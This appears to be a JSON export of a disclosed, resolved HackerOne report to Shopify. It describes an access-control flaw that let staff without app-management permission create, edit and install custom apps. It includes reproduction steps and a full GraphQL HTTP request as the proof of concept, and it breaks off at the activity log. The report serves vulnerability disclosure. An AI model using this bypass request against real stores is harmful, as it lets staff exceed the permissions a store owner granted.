{
  "id": 1555502,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTU1NTAy",
  "url": "https://hackerone.com/reports/1555502",
  "title": "Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-04-30T22:25:14.482Z",
  "submitted_at": "2022-04-30T22:25:14.636Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kun_19",
    "url": "/kun_19",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-07-11T17:50:35.738Z",
  "bug_reporter_agreed_on_going_public_at": "2022-07-11T17:50:35.665Z",
  "team_member_agreed_on_going_public_at": "2022-07-11T17:23:43.809Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\n### Custom Apps - Permissions\n\nThe store owner, collaborators and staff members can create, edit and install custom apps for their shopify store. Therefor, these users need multiple permissions.  The permissions\n\n* `View apps developed by staff and collaborators`\n* `Develop apps` and\n* `Manage and install apps and channels`\n\nare  all needed. See also https://shopify.dev/apps/auth/admin-app-access-tokens#changing-api-scopes:\n\n> Anyone with a staff or collaborator account on a store can change what store resources an admin-created custom app can access, but only if they have all the following permissions:\n    * the Manage and install apps and channels permission and the Develop apps permission\n    * the relevant permissions for the respective store resource\n\n### Missing \"Manage and install apps and channels\" permission\n\nIf the `Manage and install apps and channels` permission is finally not granted to a user, custom apps can't be created, edited or installed. The staff user in F1712978 has for example the two permissions `View apps developed by staff and collaborators` and `Develop apps` but **not** the `Manage and install apps and channels` permission. Thus, he is not able to create, edit and install custom apps. He is also not even able to reach the relevant config section at https://<YOUR_STORE>/admin/apps/development  to manage custom apps:  \n\n{F1712979}\n\nFurthermore, the direct usage of the relevant API endpoints is also not possible. The request to create a custom app is not permitted and the server states that the user must have edit permissions for custom apps:\n\n```\nPOST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2\nHost: 19kun-19.myshopify.com\nCookie: <COOKIES_STAFF_MEMBER>\nX-Csrf-Token: <CSRF_STAFF_MEMBER>\nOrigin: https://19kun-19.myshopify.com\n...\n\n{\n   \"operationName\":\"CreateAppMutation\",\n   \"variables\":{\n      \"input\":{\n         \"title\":\"test\",\n         \"maintainerUserId\":\"gid://shopify/StaffMember/76770345016\"\n      }\n   },\n   \"query\":\"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\\n  shopOwnedAppCreate(input: $input) {\\n    app {\\n      id\\n      title\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      code\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\n\n```\nHTTP/2 200 OK\nDate: Sat, 30 Apr 2022 20:04:03 GMT\nContent-Type: application/json; charset=utf-8\n...\n\n{\n   \"data\":{\n      \"shopOwnedAppCreate\":null\n   },\n   \"errors\":[\n      {\n         \"message\":\"Access denied for shopOwnedAppCreate field. Required access: The user must have edit permissions for custom apps.\",\n         \"locations\":[\n            {\n               \"line\":2,\n               \"column\":3\n            }\n         ],\n         \"path\":[\n            \"shopOwnedAppCreate\"\n         ],\n         \"extensions\":{\n            \"code\":\"ACCESS_DENIED\",\n            \"documentation\":\"https:\\/\\/shopify.dev\\/api\\/usage\\/access-scopes\",\n            \"requiredAccess\":\"The user must have edit permissions for custom apps.\"\n         }\n      }\n   ],\n   ...\n}\n```\n\nSo far, so good, but if the store owner now decides to give the staff member only a permission to  **one specific** app (see F1712985), a problem occurs.\nThe staff member still have no access to the config section for managing the custom apps...  \n\n{F1712990}  \n{F1712991}\n\n...but when using the API endpoints now directly, custom apps can be **created**, **edited** and **installed** by the staff member! The HTTP request above is now successful and the custom app could be created. This is definitely not intended. \n\n## Shops Used to Test:\nhttps://19kun-19.myshopify.com\n\n## Steps To Reproduce:\n\n  1. As s store owner, enable the custom app development\n  2. Make sure you added a staff member to your store and give him the two rights `View apps developed by staff and collaborators` and`Develop apps` **and** the permission for just **one** specific app (like in F1712985)\n  3. Log in as staff member and visit https://<YOUR_STORE>/admin/apps/development (the config section for custom apps). You should see that you have no permissions to access this view (like in F1712991)\n  4. Create a custom app by executing following request (replace the placeholders appropriately):  \n```\nPOST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2\nHost: <YOUR_STORE>\nCookie: <STAFF_MEMBER_COOKIE>\nContent-Length: 428\nSec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"\nX-Csrf-Token: <CSRF_TOKEN>\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\nContent-Type: application/json\nAccept: application/json\nX-Shopify-Web-Force-Proxy: 1\nSec-Ch-Ua-Platform: \"Linux\"\nOrigin: https://19kun-19.myshopify.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{\n   \"operationName\":\"CreateAppMutation\",\n   \"variables\":{\n      \"input\":{\n         \"title\":\"Broken Access PoC\",\n         \"maintainerUserId\":\"gid://shopify/StaffMember/<STAFF_MEMBER_ID>\"\n      }\n   },\n   \"query\":\"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\\n  shopOwnedAppCreate(input: $input) {\\n    app {\\n      id\\n      title\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      code\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\n  5. Visit https://<YOUR_STORE>/admin/apps/development as a **store owner**. You should now observe the created custom app by the staff member:  \n{F1713002}\n\n**NOTE**: The other API endpoints related to the custom apps can also be used. Thus, after creating the custom app, the staff member is for example also able to edit the Admin API access scope and install the custom app.\n\n## Impact\n\nA shopify store owner / admin relies on the documentation and assumes that a staff member without the permission to `Manage and install apps and channels` is not able to create, edit or install custom apps. If the store owner / admin now grants a staff member the permission to only one app, the staff member (attacker) is able to\n\n* create and install new custom apps with specific Admin API access scopes\n* edit / modify existing custom apps of the store admin / other staff members, including\n  * changing Admin API scopes (Integrity)\n  * uninstalling the app (Availability)\n  * uninstalling / reinstalling the app (which rotates the access keys) (Integrity + Availability)\n  * etc.",
  "bounty_amount": "1900.0",
  "formatted_bounty": "$1,900",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1712978,
      "file_name": "needed_permissions.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zs9cd7ih0f4j9l86voi42ph0nu4l?response-content-disposition=attachment%3B%20filename%3D%22needed_permissions.png%22%3B%20filename%2A%3DUTF-8%27%27needed_permissions.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=268f2603ac376d89690a81eaf141e7c40466879accc210fe0ec5a0d19739814b",
      "file_size": 102816,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1712979,
      "file_name": "no_permission_dev_view.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4n425oeaczucpng56jaam8xa34z9?response-content-disposition=attachment%3B%20filename%3D%22no_permission_dev_view.png%22%3B%20filename%2A%3DUTF-8%27%27no_permission_dev_view.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13f55e6815c226a7ee9582457efba84892fcef2acdd822aa5128baee9ccdf6cc",
      "file_size": 46797,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1712985,
      "file_name": "permission_specific_app.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tol52xt3qr3siyptui4fu56rqdxz?response-content-disposition=attachment%3B%20filename%3D%22permission_specific_app.png%22%3B%20filename%2A%3DUTF-8%27%27permission_specific_app.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2d0bdafa1580afea1bac63c7a842343d963cf6cd77039fcb8281467e2a0ac67d",
      "file_size": 100058,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1712990,
      "file_name": "admin_apps.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pcitgqne66dvbj4w1u7jlq8i4tja?response-content-disposition=attachment%3B%20filename%3D%22admin_apps.png%22%3B%20filename%2A%3DUTF-8%27%27admin_apps.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4b6595593115fb52dd3da017d00d287c7a1983f5771533d095fa38ef6c3e600",
      "file_size": 72892,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1712991,
      "file_name": "no_permission_dev_view_2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3c2y8bj02h9h1sfrnxux2ao7xem9?response-content-disposition=attachment%3B%20filename%3D%22no_permission_dev_view_2.png%22%3B%20filename%2A%3DUTF-8%27%27no_permission_dev_view_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=62e7a8268b54b6406ea485898ee9bcf39427e342797fae62e943b8e1500239f6",
      "file_size": 41460,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1713002,
      "file_name": "created_custom_app.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m0kwcrwifsjcdswaxcbvvtl55wyz?response-content-disposition=attachment%3B%20filename%3D%22created_custom_app.png%22%3B%20filename%2A%3DUTF-8%27%27created_custom_app.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070143Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=23785ec217ba2cf290819553671a0bb137679fb54b7aeeb077fced37f85f5f7c",
      "file_size": 73887,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 39,
  "voters": [
    "jerry_jakcson",
    "yakunachisli",
    "sec28th",
    "n1m0",
    "drsniper",
    "anish_kosaraju",
    "kun_19",
    "awararesearcher",
    "abdellah29",
    "zy9ard3",
    "and 29 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 413,
    "asset_type": "URL",
    "asset_identifier": "your-store.myshopify.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 16513188,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
